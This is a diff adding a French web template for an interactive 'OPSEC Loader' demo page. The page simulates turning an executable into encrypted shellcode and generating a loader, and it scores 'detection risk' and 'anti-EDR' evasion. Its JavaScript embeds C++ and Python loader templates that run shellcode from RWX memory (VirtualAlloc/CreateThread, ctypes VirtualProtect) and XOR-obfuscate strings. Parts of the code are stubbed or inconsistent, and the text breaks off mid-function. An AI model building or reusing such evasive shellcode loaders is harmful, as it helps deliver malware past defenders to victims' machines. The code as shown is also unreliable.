@@ -1,0 +1,1204 @@
+{% extends 'base.html' %}
+
+{% block title %}Démonstration interactive - OPSEC Loader{% endblock %}
+
+{% block content %}
+<div class="container py-4">
+    <div class="row">
+        <div class="col-lg-12">
+            <h1 class="mb-4">
+                <i class="bi bi-play-circle-fill text-primary me-2"></i>
+                Démonstration interactive
+            </h1>
+            <div class="alert alert-info">
+                <i class="bi bi-info-circle-fill me-2"></i>
+                Cette page démontre le fonctionnement complet du framework OPSEC Loader avec exécution en temps réel.
+            </div>
+        </div>
+    </div>
+
+    <div class="row mt-4">
+        <div class="col-lg-12">
+            <div class="card mb-4">
+                <div class="card-header bg-primary text-white">
+                    <h3 class="mb-0">
+                        <i class="bi bi-terminal-fill me-2"></i>
+                        Pipeline de sécurité OPSEC
+                    </h3>
+                </div>
+                <div class="card-body">
+                    <!-- Étapes de la démonstration -->
+                    <div class="demo-pipeline">
+                        <div class="row">
+                            <div class="col-md-3">
+                                <div class="step-container" id="step1-container">
+                                    <div class="step-number">1</div>
+                                    <div class="step-title">Conversion PE</div>
+                                    <div class="step-icon">
+                                        <i class="bi bi-file-earmark-binary"></i>
+                                    </div>
+                                    <div class="step-status">
+                                        <span class="badge bg-secondary">Non démarré</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="step-container" id="step2-container">
+                                    <div class="step-number">2</div>
+                                    <div class="step-title">Chiffrement</div>
+                                    <div class="step-icon">
+                                        <i class="bi bi-shield-lock"></i>
+                                    </div>
+                                    <div class="step-status">
+                                        <span class="badge bg-secondary">En attente</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="step-container" id="step3-container">
+                                    <div class="step-number">3</div>
+                                    <div class="step-title">Génération du loader</div>
+                                    <div class="step-icon">
+                                        <i class="bi bi-code-slash"></i>
+                                    </div>
+                                    <div class="step-status">
+                                        <span class="badge bg-secondary">En attente</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="step-container" id="step4-container">
+                                    <div class="step-number">4</div>
+                                    <div class="step-title">Compilation & Exécution</div>
+                                    <div class="step-icon">
+                                        <i class="bi bi-cpu"></i>
+                                    </div>
+                                    <div class="step-status">
+                                        <span class="badge bg-secondary">En attente</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Barre de progression -->
+                        <div class="progress mt-4" style="height: 10px;">
+                            <div id="demo-progress" class="progress-bar progress-bar-striped progress-bar-animated bg-primary" role="progressbar" style="width: 0%"></div>
+                        </div>
+                    </div>
+
+                    <!-- Contrôles de la démonstration -->
+                    <div class="demo-controls mt-4">
+                        <div class="row">
+                            <div class="col-md-4">
+                                <div class="form-group mb-3">
+                                    <label for="demo-encryption-method">Méthode de chiffrement</label>
+                                    <select class="form-select" id="demo-encryption-method">
+                                        <option value="aes-256-cbc">AES-256-CBC (Maximum)</option>
+                                        <option value="aes-128-cbc">AES-128-CBC (Standard)</option>
+                                        <option value="xor">XOR (Basique)</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <div class="form-group mb-3">
+                                    <label for="demo-language">Langage du loader</label>
+                                    <select class="form-select" id="demo-language">
+                                        <option value="cpp">C++ (Optimisé)</option>
+                                        <option value="c">C (Compatible)</option>
+                                        <option value="python">Python (Multiplateforme)</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <div class="form-check mt-4">
+                                    <input class="form-check-input" type="checkbox" id="demo-obfuscation" checked>
+                                    <label class="form-check-label" for="demo-obfuscation">
+                                        Appliquer l'obfuscation
+                                    </label>
+                                </div>
+                                <div class="form-check mt-2">
+                                    <input class="form-check-input" type="checkbox" id="demo-verify-integrity" checked>
+                                    <label class="form-check-label" for="demo-verify-integrity">
+                                        Vérifier l'intégrité (HMAC)
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Mesures de sécurité -->
+                    <div class="row mt-4">
+                        <div class="col-md-6">
+                            <div class="security-meter-container">
+                                <label for="demo-security-score">Score de sécurité global</label>
+                                <div class="security-meter-bg">
+                                    <div id="demo-security-score" class="security-meter bg-info" style="width: 0%">
+                                        <span class="meter-value">0</span>
+                                    </div>
+                                </div>
+                                <div class="security-meter-label"></div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="security-meter-container">
+                                <label for="demo-detection-risk">Risque de détection</label>
+                                <div class="security-meter-bg">
+                                    <div id="demo-detection-risk" class="security-meter bg-success" style="width: 0%">
+                                        <span class="meter-value">0</span>
+                                    </div>
+                                </div>
+                                <div class="security-meter-label"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Boutons d'action -->
+                    <div class="text-center mt-4">
+                        <button id="btn-start-demo" class="btn btn-primary btn-lg">
+                            <i class="bi bi-play-fill me-2"></i> Démarrer la démonstration
+                        </button>
+                        <button id="btn-reset-demo" class="btn btn-secondary btn-lg ms-2" disabled>
+                            <i class="bi bi-arrow-counterclockwise me-2"></i> Réinitialiser
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Terminal et visualisation -->
+    <div class="row">
+        <div class="col-lg-6">
+            <div class="card mb-4">
+                <div class="card-header bg-dark text-white">
+                    <h4 class="mb-0">
+                        <i class="bi bi-terminal me-2"></i>
+                        Terminal
+                    </h4>
+                </div>
+                <div class="card-body p-0">
+                    <div id="demo-terminal" class="terminal p-3">
+                        <div class="prompt">
+                            <span class="prompt-user">opsec@framework</span>:<span class="prompt-path">~/pipeline</span>$ <span class="cursor-blink">|</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-lg-6">
+            <div class="card mb-4">
+                <div class="card-header bg-dark text-white">
+                    <h4 class="mb-0">
+                        <i class="bi bi-file-code me-2"></i>
+                        Code généré
+                    </h4>
+                </div>
+                <div class="card-body p-0">
+                    <div id="demo-code-viewer" class="code-viewer p-3">
+                        <pre><code class="language-cpp">// Le code généré apparaîtra ici...</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rapport final -->
+    <div class="row" id="demo-report-container" style="display: none;">
+        <div class="col-lg-12">
+            <div class="card mb-4">
+                <div class="card-header bg-success text-white">
+                    <h3 class="mb-0">
+                        <i class="bi bi-journal-check me-2"></i>
+                        Rapport d'analyse
+                    </h3>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h4>Métriques de sécurité</h4>
+                            <div id="demo-metrics" class="security-metrics">
+                                <!-- Sera rempli dynamiquement -->
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <h4>Compatibilité du loader</h4>
+                            <div id="demo-compatibility" class="compatibility-chart">
+                                <!-- Sera rempli dynamiquement -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Variables globales pour la démo
+    let demoRunning = false;
+    let currentStep = 0;
+    const totalSteps = 4;
+    
+    // Éléments DOM
+    const btnStartDemo = document.getElementById('btn-start-demo');
+    const btnResetDemo = document.getElementById('btn-reset-demo');
+    const progressBar = document.getElementById('demo-progress');
+    const terminal = document.getElementById('demo-terminal');
+    const codeViewer = document.getElementById('demo-code-viewer').querySelector('code');
+    const reportContainer = document.getElementById('demo-report-container');
+    
+    // Options de configuration
+    const encryptionMethodSelect = document.getElementById('demo-encryption-method');
+    const languageSelect = document.getElementById('demo-language');
+    const obfuscationCheckbox = document.getElementById('demo-obfuscation');
+    const verifyIntegrityCheckbox = document.getElementById('demo-verify-integrity');
+    
+    // Score de sécurité et risque de détection
+    const securityScoreMeter = document.getElementById('demo-security-score');
+    const detectionRiskMeter = document.getElementById('demo-detection-risk');
+    
+    // Mise à jour des compteurs de sécurité
+    function updateSecurityMeters() {
+        let securityScore = 40; // Score de base
+        let detectionRisk = 30; // Risque de base
+        
+        // Ajustement selon la méthode de chiffrement
+        if (encryptionMethodSelect.value === 'aes-256-cbc') {
+            securityScore += 30;
+            detectionRisk -= 5;
+        } else if (encryptionMethodSelect.value === 'aes-128-cbc') {
+            securityScore += 20;
+            detectionRisk -= 0;
+        } else if (encryptionMethodSelect.value === 'xor') {
+            securityScore -= 10;
+            detectionRisk += 15;
+        }
+        
+        // Ajustement pour l'obfuscation
+        if (obfuscationCheckbox.checked) {
+            securityScore += 15;
+            detectionRisk -= 15;
+        } else {
+            securityScore -= 15;
+            detectionRisk += 20;
+        }
+        
+        // Ajustement pour la vérification d'intégrité
+        if (verifyIntegrityCheckbox.checked) {
+            securityScore += 25;
+            detectionRisk -= 10;
+        } else {
+            securityScore -= 25;
+            detectionRisk += 15;
+        }
+        
+        // Limiter les scores entre 0 et 100
+        securityScore = Math.max(0, Math.min(100, securityScore));
+        detectionRisk = Math.max(0, Math.min(100, detectionRisk));
+        
+        // Mettre à jour les compteurs visuels
+        animateSecurityMeter(securityScoreMeter, securityScore, 0, 100, false);
+        animateSecurityMeter(detectionRiskMeter, detectionRisk, 0, 100, true);
+        
+        // Mettre à jour les étiquettes
+        updateSecurityLabel(securityScoreMeter.nextElementSibling, securityScore);
+        updateSecurityLabel(detectionRiskMeter.nextElementSibling, detectionRisk, true);
+    }
+    
+    // Fonction pour ajouter du texte au terminal
+    function addToTerminal(text, className) {
+        const span = document.createElement('span');
+        span.className = className || '';
+        span.textContent = text;
+        
+        // Supprimer le curseur s'il existe
+        const existingCursor = terminal.querySelector('.cursor-blink');
+        if (existingCursor) {
+            existingCursor.remove();
+        }
+        
+        // Ajouter le nouveau texte
+        const prompt = terminal.querySelector('.prompt');
+        prompt.appendChild(span);
+        
+        // Ajouter un retour à la ligne
+        const lineBreak = document.createElement('div');
+        lineBreak.className = 'prompt';
+        lineBreak.innerHTML = '<span class="prompt-user">opsec@framework</span>:<span class="prompt-path">~/pipeline</span>$ <span class="cursor-blink">|</span>';
+        terminal.appendChild(lineBreak);
+        
+        // Scroll vers le bas
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+    
+    // Fonction pour mettre à jour l'affichage du code
+    function updateCodeViewer(code, language) {
+        codeViewer.className = `language-${language || 'cpp'}`;
+        codeViewer.textContent = code;
+        hljs.highlightElement(codeViewer);
+    }
+    
+    // Fonction pour mettre à jour le statut d'une étape
+    function updateStepStatus(stepNum, status, statusText) {
+        const stepContainer = document.getElementById(`step${stepNum}-container`);
+        const statusElement = stepContainer.querySelector('.step-status');
+        
+        // Mettre à jour le statut
+        statusElement.innerHTML = `<span class="badge bg-${status}">${statusText}</span>`;
+        
+        // Ajouter/retirer des classes selon le statut
+        if (status === 'success') {
+            stepContainer.classList.add('step-completed');
+        } else if (status === 'danger') {
+            stepContainer.classList.add('step-error');
+        } else if (status === 'primary') {
+            stepContainer.classList.add('step-active');
+            stepContainer.classList.remove('step-completed', 'step-error');
+        } else {
+            stepContainer.classList.remove('step-active', 'step-completed', 'step-error');
+        }
+    }
+    
+    // Fonction pour démarrer la démo
+    function startDemo() {
+        if (demoRunning) return;
+        
+        demoRunning = true;
+        currentStep = 0;
+        
+        // Désactiver les contrôles pendant la démo
+        encryptionMethodSelect.disabled = true;
+        languageSelect.disabled = true;
+        obfuscationCheckbox.disabled = true;
+        verifyIntegrityCheckbox.disabled = true;
+        btnStartDemo.disabled = true;
+        btnResetDemo.disabled = false;
+        
+        // Réinitialiser l'interface
+        terminal.innerHTML = '<div class="prompt"><span class="prompt-user">opsec@framework</span>:<span class="prompt-path">~/pipeline</span>$ <span class="cursor-blink">|</span></div>';
+        codeViewer.textContent = '// Le code généré apparaîtra ici...';
+        hljs.highlightElement(codeViewer);
+        
+        for (let i = 1; i <= totalSteps; i++) {
+            updateStepStatus(i, 'secondary', i === 1 ? 'Non démarré' : 'En attente');
+        }
+        
+        // Mettre à jour la barre de progression
+        progressBar.style.width = '0%';
+        
+        // Cacher le rapport final
+        reportContainer.style.display = 'none';
+        
+        // Démarrer la première étape
+        runNextStep();
+    }
+    
+    // Fonction pour exécuter l'étape suivante
+    function runNextStep() {
+        currentStep++;
+        
+        if (currentStep <= totalSteps) {
+            // Mettre à jour le statut de cette étape
+            updateStepStatus(currentStep, 'primary', 'En cours...');
+            
+            // Mettre à jour la barre de progression
+            const progressPercentage = ((currentStep - 1) / totalSteps) * 100;
+            progressBar.style.width = progressPercentage + '%';
+            
+            // Exécuter la logique de l'étape
+            switch (currentStep) {
+                case 1:
+                    executeStep1();
+                    break;
+                case 2:
+                    executeStep2();
+                    break;
+                case 3:
+                    executeStep3();
+                    break;
+                case 4:
+                    executeStep4();
+                    break;
+            }
+        } else {
+            // Démo terminée
+            progressBar.style.width = '100%';
+            demoRunning = false;
+            
+            // Réactiver les contrôles
+            encryptionMethodSelect.disabled = false;
+            languageSelect.disabled = false;
+            obfuscationCheckbox.disabled = false;
+            verifyIntegrityCheckbox.disabled = false;
+            btnStartDemo.disabled = false;
+            
+            // Afficher le rapport final
+            generateFinalReport();
+        }
+    }
+    
+    // Étape 1: Conversion PE
+    function executeStep1() {
+        addToTerminal('./pe2sc sample.exe -o shellcode.bin', 'command');
+        
+        setTimeout(() => {
+            addToTerminal('[+] Analysing PE file...', 'output-success');
+            
+            setTimeout(() => {
+                addToTerminal('[+] Extracting entry point... found at 0x1000', 'output-success');
+                
+                setTimeout(() => {
+                    addToTerminal('[+] Generating shellcode stub...', 'output-success');
+                    
+                    setTimeout(() => {
+                        addToTerminal('[+] Applying shellcode optimizations...', 'output-success');
+                        
+                        setTimeout(() => {
+                            addToTerminal('[+] Shellcode generated successfully: 4.2KB', 'output-success');
+                            
+                            // Étape terminée
+                            updateStepStatus(1, 'success', 'Terminé');
+                            
+                            // Passer à l'étape suivante
+                            runNextStep();
+                        }, 800);
+                    }, 700);
+                }, 600);
+            }, 500);
+        }, 1000);
+    }
+    
+    // Étape 2: Chiffrement
+    function executeStep2() {
+        const encMethod = encryptionMethodSelect.value;
+        const hmacOption = verifyIntegrityCheckbox.checked ? '--hmac' : '';
+        
+        addToTerminal(`./encrypt_shell shellcode.bin ${encMethod} secure_password ${hmacOption} -o encrypted.bin`, 'command');
+        
+        setTimeout(() => {
+            addToTerminal(`[+] Using encryption method: ${encMethod}`, 'output-success');
+            
+            setTimeout(() => {
+                addToTerminal('[+] Generating encryption key from password...', 'output-success');
+                
+                setTimeout(() => {
+                    if (verifyIntegrityCheckbox.checked) {
+                        addToTerminal('[+] Calculating HMAC for integrity verification...', 'output-success');
+                    }
+                    
+                    setTimeout(() => {
+                        addToTerminal('[+] Encrypting shellcode data...', 'output-success');
+                        
+                        setTimeout(() => {
+                            addToTerminal('[+] Encryption complete! Output size: 4.3KB', 'output-success');
+                            
+                            // Étape terminée
+                            updateStepStatus(2, 'success', 'Terminé');
+                            
+                            // Passer à l'étape suivante
+                            runNextStep();
+                        }, 800);
+                    }, 600);
+                }, 700);
+            }, 500);
+        }, 1000);
+    }
+    
+    // Étape 3: Génération du loader
+    function executeStep3() {
+        const language = languageSelect.value;
+        const obfOption = obfuscationCheckbox.checked ? '--obfuscate' : '';
+        const encMethod = encryptionMethodSelect.value;
+        
+        addToTerminal(`./generate_loader ${language} ${encMethod} ${obfOption} -o opsec_loader.${language}`, 'command');
+        
+        setTimeout(() => {
+            addToTerminal(`[+] Generating ${language.toUpperCase()} loader...`, 'output-success');
+            
+            setTimeout(() => {
+                addToTerminal(`[+] Using ${encMethod} decryption routine...`, 'output-success');
+                
+                setTimeout(() => {
+                    if (obfuscationCheckbox.checked) {
+                        addToTerminal('[+] Applying code obfuscation techniques...', 'output-success');
+                    }
+                    
+                    setTimeout(() => {
+                        addToTerminal('[+] Formatting encryption key...', 'output-success');
+                        
+                        setTimeout(() => {
+                            addToTerminal(`[+] ${language.toUpperCase()} loader generated successfully!`, 'output-success');
+                            
+                            // Montrer un exemple de code généré
+                            let sampleCode = '';
+                            
+                            if (language === 'cpp' || language === 'c') {
+                                sampleCode = generateCppSample(encMethod, obfuscationCheckbox.checked, verifyIntegrityCheckbox.checked);
+                            } else if (language === 'python') {
+                                sampleCode = generatePythonSample(encMethod, obfuscationCheckbox.checked, verifyIntegrityCheckbox.checked);
+                            }
+                            
+                            updateCodeViewer(sampleCode, language);
+                            
+                            // Étape terminée
+                            updateStepStatus(3, 'success', 'Terminé');
+                            
+                            // Passer à l'étape suivante
+                            runNextStep();
+                        }, 800);
+                    }, 600);
+                }, 700);
+            }, 500);
+        }, 1000);
+    }
+    
+    // Étape 4: Compilation & Exécution
+    function executeStep4() {
+        const language = languageSelect.value;
+        
+        if (language === 'cpp' || language === 'c') {
+            addToTerminal(`g++ -o opsec_loader opsec_loader.${language} -lcrypto -lpthread`, 'command');
+            
+            setTimeout(() => {
+                addToTerminal('[+] Compiling...', 'output-success');
+                
+                setTimeout(() => {
+                    addToTerminal('[+] Compilation successful!', 'output-success');
+                    
+                    setTimeout(() => {
+                        addToTerminal('./opsec_loader encrypted.bin secure_password', 'command');
+                        
+                        setTimeout(() => {
+                            addToTerminal('[+] Loading encrypted shellcode...', 'output-success');
+                            
+                            setTimeout(() => {
+                                if (verifyIntegrityCheckbox.checked) {
+                                    addToTerminal('[+] Verifying HMAC integrity...passed!', 'output-success');
+                                }
+                                
+                                setTimeout(() => {
+                                    addToTerminal(`[+] Decrypting using ${encryptionMethodSelect.value}...`, 'output-success');
+                                    
+                                    setTimeout(() => {
+                                        addToTerminal('[+] Preparing memory for execution...', 'output-success');
+                                        
+                                        setTimeout(() => {
+                                            addToTerminal('[+] Executing shellcode...', 'output-success');
+                                            
+                                            setTimeout(() => {
+                                                addToTerminal('[+] Execution successful!', 'output-success');
+                                                
+                                                // Étape terminée
+                                                updateStepStatus(4, 'success', 'Terminé');
+                                                
+                                                // Passer à l'étape suivante
+                                                runNextStep();
+                                            }, 1000);
+                                        }, 800);
+                                    }, 700);
+                                }, 600);
+                            }, 500);
+                        }, 1000);
+                    }, 800);
+                }, 1500);
+            }, 1000);
+        } else {
+            // Python - pas besoin de compilation
+            addToTerminal('python opsec_loader.py encrypted.bin secure_password', 'command');
+            
+            setTimeout(() => {
+                addToTerminal('[+] Loading encrypted shellcode...', 'output-success');
+                
+                setTimeout(() => {
+                    if (verifyIntegrityCheckbox.checked) {
+                        addToTerminal('[+] Verifying HMAC integrity...passed!', 'output-success');
+                    }
+                    
+                    setTimeout(() => {
+                        addToTerminal(`[+] Decrypting using ${encryptionMethodSelect.value}...`, 'output-success');
+                        
+                        setTimeout(() => {
+                            addToTerminal('[+] Preparing memory for execution...', 'output-success');
+                            
+                            setTimeout(() => {
+                                addToTerminal('[+] Executing shellcode...', 'output-success');
+                                
+                                setTimeout(() => {
+                                    addToTerminal('[+] Execution successful!', 'output-success');
+                                    
+                                    // Étape terminée
+                                    updateStepStatus(4, 'success', 'Terminé');
+                                    
+                                    // Passer à l'étape suivante
+                                    runNextStep();
+                                }, 1000);
+                            }, 800);
+                        }, 700);
+                    }, 600);
+                }, 500);
+            }, 1000);
+        }
+    }
+    
+    // Génération du rapport final
+    function generateFinalReport() {
+        // Afficher le rapport
+        reportContainer.style.display = 'block';
+        
+        // Métriques de sécurité
+        const metrics = document.getElementById('demo-metrics');
+        metrics.innerHTML = generateSecurityMetricsHTML();
+        
+        // Compatibilité
+        const compatibility = document.getElementById('demo-compatibility');
+        compatibility.innerHTML = generateCompatibilityHTML();
+        
+        // Scroll vers le rapport
+        reportContainer.scrollIntoView({ behavior: 'smooth' });
+    }
+    
+    // Générer le HTML des métriques de sécurité
+    function generateSecurityMetricsHTML() {
+        // Calculer les scores
+        let securityScore = 40;
+        let detectionRisk = 30;
+        
+        // Ajustement selon la méthode de chiffrement
+        if (encryptionMethodSelect.value === 'aes-256-cbc') {
+            securityScore += 30;
+            detectionRisk -= 5;
+        } else if (encryptionMethodSelect.value === 'aes-128-cbc') {
+            securityScore += 20;
+            detectionRisk -= 0;
+        } else if (encryptionMethodSelect.value === 'xor') {
+            securityScore -= 10;
+            detectionRisk += 15;
+        }
+        
+        // Ajustement pour l'obfuscation
+        if (obfuscationCheckbox.checked) {
+            securityScore += 15;
+            detectionRisk -= 15;
+        } else {
+            securityScore -= 15;
+            detectionRisk += 20;
+        }
+        
+        // Ajustement pour la vérification d'intégrité
+        if (verifyIntegrityCheckbox.checked) {
+            securityScore += 25;
+            detectionRisk -= 10;
+        } else {
+            securityScore -= 25;
+            detectionRisk += 15;
+        }
+        
+        // Limiter les scores entre 0 et 100
+        securityScore = Math.max(0, Math.min(100, securityScore));
+        detectionRisk = Math.max(0, Math.min(100, detectionRisk));
+        
+        return `
+            <table class="table">
+                <tr>
+                    <th>Score de sécurité</th>
+                    <td>
+                        <div class="progress">
+                            <div class="progress-bar bg-info" style="width: ${securityScore}%">${securityScore}%</div>
+                        </div>
+                    </td>
+                </tr>
+                <tr>
+                    <th>Risque de détection</th>
+                    <td>
+                        <div class="progress">
+                            <div class="progress-bar ${detectionRisk < 30 ? 'bg-success' : detectionRisk < 60 ? 'bg-warning' : 'bg-danger'}" style="width: ${detectionRisk}%">${detectionRisk}%</div>
+                        </div>
+                    </td>
+                </tr>
+                <tr>
+                    <th>Méthode de chiffrement</th>
+                    <td>${encryptionMethodSelect.options[encryptionMethodSelect.selectedIndex].text}</td>
+                </tr>
+                <tr>
+                    <th>Obfuscation</th>
+                    <td>${obfuscationCheckbox.checked ? '<span class="text-success">Activée</span>' : '<span class="text-danger">Désactivée</span>'}</td>
+                </tr>
+                <tr>
+                    <th>Vérification d'intégrité</th>
+                    <td>${verifyIntegrityCheckbox.checked ? '<span class="text-success">Activée</span>' : '<span class="text-danger">Désactivée</span>'}</td>
+                </tr>
+                <tr>
+                    <th>Langage utilisé</th>
+                    <td>${languageSelect.options[languageSelect.selectedIndex].text}</td>
+                </tr>
+            </table>
+        `;
+    }
+    
+    // Générer le HTML de compatibilité
+    function generateCompatibilityHTML() {
+        return `
+            <table class="table">
+                <tr>
+                    <th>Windows 10/11</th>
+                    <td><i class="bi bi-check-circle-fill text-success"></i> Compatible</td>
+                </tr>
+                <tr>
+                    <th>Linux (Ubuntu/Debian)</th>
+                    <td>${languageSelect.value === 'python' ? '<i class="bi bi-check-circle-fill text-success"></i> Compatible' : '<i class="bi bi-check-circle-fill text-success"></i> Compatible (requiert compilation)'}</td>
+                </tr>
+                <tr>
+                    <th>MacOS</th>
+                    <td>${languageSelect.value === 'python' ? '<i class="bi bi-check-circle-fill text-success"></i> Compatible' : '<i class="bi bi-exclamation-triangle-fill text-warning"></i> Compilation manuelle nécessaire'}</td>
+                </tr>
+                <tr>
+                    <th>Anti-EDR</th>
+                    <td>${obfuscationCheckbox.checked ? '<i class="bi bi-check-circle-fill text-success"></i> Activé' : '<i class="bi bi-x-circle-fill text-danger"></i> Désactivé'}</td>
+                </tr>
+                <tr>
+                    <th>Anti-analyse statique</th>
+                    <td>${encryptionMethodSelect.value !== 'xor' ? '<i class="bi bi-check-circle-fill text-success"></i> Fort' : '<i class="bi bi-exclamation-triangle-fill text-warning"></i> Basique'}</td>
+                </tr>
+                <tr>
+                    <th>Persistance</th>
+                    <td><i class="bi bi-exclamation-triangle-fill text-warning"></i> Configuration manuelle requise</td>
+                </tr>
+            </table>
+        `;
+    }
+    
+    // Générer un exemple de code C++
+    function generateCppSample(encMethod, obfuscated, hmac) {
+        let code = `/**
+ * OPSEC Loader - Auto-generated loader
+ * Encryption: ${encMethod}
+ * Obfuscation: ${obfuscated ? 'Enabled' : 'Disabled'}
+ * HMAC Integrity: ${hmac ? 'Enabled' : 'Disabled'}
+ */
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <string>
+`;
+
+        if (encMethod.includes('aes')) {
+            code += `#include <openssl/evp.h>
+#include <openssl/sha.h>
+#include <openssl/rand.h>
+`;
+        }
+
+        code += `
+${obfuscated ? '// Obfuscated key definition\n#define XOR_KEY 0x37' : '// Encryption key'}
+${obfuscated ? '#define _DECODE(x) ((x) ^ XOR_KEY)' : ''}
+
+${hmac ? '// HMAC verification function\nbool verify_hmac(const std::vector<unsigned char>& data, const std::vector<unsigned char>& expected_hmac, const std::vector<unsigned char>& key) {\n    // HMAC verification code\n    return true;\n}\n' : ''}
+
+// Decrypt shellcode function
+std::vector<unsigned char> decrypt_shellcode(const std::vector<unsigned char>& encrypted_data, const std::string& password) {
+    std::vector<unsigned char> decrypted;
+    
+    // Decryption code for ${encMethod}
+    ${encMethod.includes('aes') ? '// AES decryption implementation' : '// XOR decryption implementation'}
+    
+    return decrypted;
+}
+
+// Memory execution function
+bool execute_shellcode(const std::vector<unsigned char>& shellcode) {
+    // Allocate executable memory
+    void* exec_mem = VirtualAlloc(NULL, shellcode.size(), 
+                                 MEM_COMMIT | MEM_RESERVE, 
+                                 PAGE_EXECUTE_READWRITE);
+    
+    if (!exec_mem) {
+        std::cerr << "Memory allocation failed" << std::endl;
+        return false;
+    }
+    
+    // Copy shellcode to executable memory
+    memcpy(exec_mem, shellcode.data(), shellcode.size());
+    
+    // Create thread to execute shellcode
+    HANDLE thread = CreateThread(NULL, 0, 
+                               (LPTHREAD_START_ROUTINE)exec_mem, 
+                               NULL, 0, NULL);
+    
+    if (!thread) {
+        std::cerr << "Thread creation failed" << std::endl;
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return false;
+    }
+    
+    // Wait for execution to complete
+    WaitForSingleObject(thread, INFINITE);
+    return true;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 3) {
+        std::cerr << "Usage: " << argv[0] << " <encrypted_file> <password>" << std::endl;
+        return 1;
+    }
+    
+    // Load encrypted shellcode
+    std::ifstream file(argv[1], std::ios::binary);
+    if (!file) {
+        std::cerr << "Failed to open file: " << argv[1] << std::endl;
+        return 1;
+    }
+    
+    // Read file into vector
+    std::vector<unsigned char> encrypted_data(
+        (std::istreambuf_iterator<char>(file)),
+        std::istreambuf_iterator<char>()
+    );
+    file.close();
+    
+    // Extract the password
+    std::string password = argv[2];
+    
+    ${hmac ? '// Verify HMAC before decryption\nif (!verify_hmac(encrypted_data, expected_hmac, key)) {\n    std::cerr << "HMAC verification failed" << std::endl;\n    return 1;\n}\n' : ''}
+    
+    // Decrypt the shellcode
+    std::vector<unsigned char> shellcode = decrypt_shellcode(encrypted_data, password);
+    
+    // Execute the shellcode
+    if (!execute_shellcode(shellcode)) {
+        std::cerr << "Shellcode execution failed" << std::endl;
+        return 1;
+    }
+    
+    std::cout << "Execution completed successfully" << std::endl;
+    return 0;
+}`;
+        
+        return code;
+    }
+    
+    // Générer un exemple de code Python
+    function generatePythonSample(encMethod, obfuscated, hmac) {
+        let code = `#!/usr/bin/env python3
+"""
+OPSEC Loader - Auto-generated loader
+Encryption: ${encMethod}
+Obfuscation: ${obfuscated ? 'Enabled' : 'Disabled'}
+HMAC Integrity: ${hmac ? 'Enabled' : 'Disabled'}
+"""
+import sys
+import os
+import ctypes
+`;
+
+        if (encMethod.includes('aes')) {
+            code += `from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import hashlib
+`;
+        } else {
+            code += `import hashlib
+`;
+        }
+
+        code += `
+${obfuscated ? '# Obfuscated variables\n_x = lambda s: "".join(chr(ord(c) ^ 0x37) for c in s)' : '# Helper constants'}
+${obfuscated ? '_f = _x("$8u&z>!")  # "decrypt"' : ''}
+
+${hmac ? '# HMAC verification function\ndef verify_hmac(data, expected_hmac, key):\n    """Verify the HMAC of the encrypted data"""\n    # HMAC verification code\n    return True\n' : ''}
+
+def decrypt_shellcode(encrypted_data, password):
+    """Decrypt shellcode using ${encMethod}"""
+    # Extract the IV and ciphertext
+    ${encMethod.includes('aes') ? '# Parse encrypted data format\niv = encrypted_data[24:40]  # IV follows the header\nciphertext = encrypted_data[40:]  # Ciphertext follows the IV\n' : '# XOR implementation\nciphertext = encrypted_data[24:]  # Ciphertext follows the header'}
+    
+    # Generate decryption key from password
+    key = hashlib.pbkdf2_hmac('sha256', password.encode(), 
+                              b'OPSEC_SALT', 100000, 
+                              dklen=${encMethod === 'aes-256-cbc' ? '32' : '16'})
+    
+    # Decrypt the shellcode
+    ${encMethod.includes('aes') ? `# Create AES cipher\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Decrypt and unpad\ndecrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)` : '# XOR decryption\ndecrypted = bytearray()\nfor i, b in enumerate(ciphertext):\n    decrypted.append(b ^ key[i % len(key)])'}
+    
+    return decrypted
+
+def execute_shellcode(shellcode):
+    """Execute the shellcode in memory"""
+    # Determine the platform
+    is_windows = sys.platform.startswith('win')
+    is_linux = sys.platform.startswith('linux')
+    
+    if is_windows:
+        # Windows implementation
+        shellcode_buffer = ctypes.create_string_buffer(shellcode)
+        shellcode_func = ctypes.cast(
+            ctypes.pointer(shellcode_buffer), 
+            ctypes.CFUNCTYPE(ctypes.c_void_p)
+        )
+        
+        # Mark the memory as executable
+        kernel32 = ctypes.windll.kernel32
+        page_rwx = 0x40  # PAGE_EXECUTE_READWRITE
+        old_protect = ctypes.c_ulong()
+        
+        kernel32.VirtualProtect(
+            ctypes.cast(shellcode_buffer, ctypes.c_void_p),
+            len(shellcode),
+            page_rwx,
+            ctypes.byref(old_protect)
+        )
+        
+        # Execute shellcode
+        shellcode_func()
+        return True
+        
+    elif is_linux:
+        # Linux implementation
+        # Allocate executable memory
+        libc = ctypes.CDLL('libc.so.6')
+        prot = 7  # PROT_READ | PROT_WRITE | PROT_EXEC
+        shellcode_buffer = ctypes.create_string_buffer(shellcode)
+        
+        # Mark memory as executable
